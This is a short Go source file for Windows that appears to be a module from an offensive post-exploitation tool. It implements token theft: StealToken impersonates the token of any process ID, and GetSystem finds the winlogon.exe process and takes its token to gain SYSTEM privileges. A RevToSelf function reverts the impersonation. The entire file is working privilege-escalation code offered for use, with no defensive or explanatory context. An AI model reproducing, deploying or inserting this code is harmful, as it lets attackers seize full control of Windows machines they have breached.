//go:build windows

package tokens

import (
	"fmt"

	"github.com/audibleblink/getsystem"
	"github.com/audibleblink/memutils"
	"golang.org/x/sys/windows"
)

func StealToken(pid int) error {
	return getsystem.OnThread(pid)
}

func RevToSelf() {
	windows.RevertToSelf()
}

func GetSystem() error {
	pid := 0
	procs, err := memutils.Processes()
	if err != nil {
		return err
	}
	for _, proc := range procs {
		if proc.Exe == "winlogon.exe" {
			pid = proc.Pid
		}
	}

	if pid == 0 {
		return fmt.Errorf("winlogon not found")
	}
	return getsystem.OnThread(pid)
}
